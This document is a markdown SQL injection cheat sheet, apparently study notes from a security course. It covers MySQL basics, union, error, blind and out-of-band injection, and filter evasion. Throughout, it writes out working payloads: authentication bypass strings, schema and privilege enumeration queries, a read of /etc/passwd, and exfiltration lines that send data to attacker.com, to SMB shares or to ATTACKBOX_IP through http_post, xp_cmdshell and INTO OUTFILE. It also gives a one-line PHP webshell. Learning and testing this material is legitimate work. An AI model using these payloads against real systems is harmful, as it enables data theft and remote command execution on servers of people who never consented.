# SQL injection (SQLi)
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

## MySQL

```bash
mysql -u root -p<password>
```

> The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line
There shouldn't be any spaces between '-p' and the password.

> We can view which privileges we have using the SHOW GRANTS command

```bash
mysql -u root -h <HOST> -P 3306 -p 
```
The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.


## Statements And Functions
### LIKE
Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %:
select * from users where username like 'a%';

### UNION
The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.


### LOAD_FILE

The LOAD_FILE() function can be used to read data from files. The function takes in just one argument, which is the file name

```bash
SELECT LOAD_FILE('/etc/passwd');
```

We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
> The default Apache webroot is `/var/www/html`.

## SQLi Types

### In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.
If you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.
The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

### Union-Based SQL Injection
This type of Injection uses the SQL `UNION` operator alongside a `SELECT` statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
Detect number of columns:
- Using ORDER BY: ' order by 1-- -
- Using UNION: ' UNION select 1,2,3-- -

```bash
# Find what databases are available on the DBMS. The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server:
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA

# To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES WHERE table_schema='dev';

# The COLUMNS table contains information about all columns present in all the databases
SELECT COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials';

# Check current user
SELECT USER() 
SELECT CURRENT_USER()
SELECT user from mysql.user

# Check user privileges
SELECT super_priv FROM mysql.user

# Other details from user_privileges table
SELECT grantee, privilege_type FROM information_schema.user_privileges
```

### Second-Order SQL Injection

> The injection occurs upon the second use of the data when it is retrieved and used in a SQL command.

### Blind SQLi
Blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless.

```bash
# To make this into a query that always returns as true, we can enter the following into the password field: 
' OR 1=1;--

# Which turns the SQL query into the following:
SELECT * FROM users WHERE username='' and password='' OR 1=1;
```

#### Blind SQLi - Boolean Based
Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information.
Blind SQLi - Time Based
This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

### Out-of-band SQL Injection
Out-of-band SQL injection uses separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features like HTTP requests, DNS queries, SMB protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.

#### Out-of-band Techniques

**MySQL and MariaDB**
In MySQL or MariaDB, Out-of-band SQL injection can be achieved using SELECT ... INTO OUTFILE or load_file command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:

```bash
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

**Microsoft SQL Server (MSSQL)**
In MSSQL, Out-of-band SQL injection can be performed using features like `xp_cmdshell`, **which allows the execution of shell commands directly from SQL queries**. This can be leveraged to write data to a file accessible via a network share:

```bash
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

> Alternatively, OPENROWSET or BULK INSERT can be used to interact with external data sources, facilitating data exfiltration through OOB channels.

#### Examples of Out-of-band Techniques

**HTTP Requests**
Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.
First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like:

```bash
SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;
```

**DNS Exfiltration**
Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.


***SMB Exfiltration**
SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. An example query would look like:

```bash
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
```

**Write File Privileges**
To be able to write files to the back-end server using a MySQL database, we require three things:
User with FILE privilege enabled
MySQL global secure_file_priv variable not enabled
Write access to the location we want to write to on the back-end server
secure_file_priv
The secure_file_priv variable is used to determine where to read/write files from: 
An empty value lets us read files from the entire file system. 
Otherwise, if a certain directory is set, we can only read from the folder specified by the variable.
NULL means we cannot read/write from any directory. 
MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege.
MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. 
Some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.


MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value:

> SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";

SELECT INTO OUTFILE

The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

Write to a file: 
> SELECT * from users INTO OUTFILE '/tmp/credentials';



Write to a remote server (for instance SMB server)

SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --



Writing a Web Shell
To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration:
Apache's configuration found at /etc/apache2/apache2.conf
Nginx's configuration at /etc/nginx/nginx.conf
IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config
Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows


We can write the following PHP webshell to be able to execute commands directly on the back-end server:

<?php system($_REQUEST[0]); ?>

Browse to the /shell.php file and execute commands via the 0 parameter. For example, with ?0=id in our URL.

Filter Evasion Techniques
Character Encoding
URL Encoding
URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload ' OR 1=1-- can be encoded as %27%20OR%201%3D1--. 

Hexadecimal Encoding
For instance, the query SELECT * FROM users WHERE name = 'admin' can be encoded as SELECT * FROM users WHERE name = 0x61646d696e.

Unicode Encoding
Unicode encoding represents characters using Unicode escape sequences. For example, the string admin can be encoded as \u0061\u0064\u006d\u0069\u006e. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.

No-Quote SQL Injection
No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

Using Numerical Values
One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting ' OR '1'='1, an attacker can use OR 1=1 in a context where quotes are not necessary.

Using SQL Comments
Another method involves using SQL comments to terminate the rest of the query. For instance, the input admin'-- can be transformed into admin--, where the -- signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.

Using CONCAT() Function
Attackers can use SQL functions like CONCAT() to construct strings without quotes. For example, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin. The CONCAT() function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.

No Spaces Allowed
When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

Comments to Replace Spaces 
One common method is to use SQL comments (/**/) to replace spaces. For example, instead of:

SELECT * FROM users WHERE name = 'admin'


an attacker can use:

SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'

 
Tab or Newline Characters
Another approach is using tab (\t) or newline (\n) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like:

SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'


Alternate Characters
One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space).


Other Techniques
HTTP Header Injection
The technique involves manipulating HTTP headers (like User-Agent, Referer, or X-Forwarded-For) to inject SQL commands. The server might log these headers or use them in SQL queries. For example, a malicious User-Agent header would look like User-Agent: ' OR 1=1; --.

Exploiting Stored Procedures
Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable to SQL injection if not properly handled.

XML and JSON Injection 
Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitise the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.

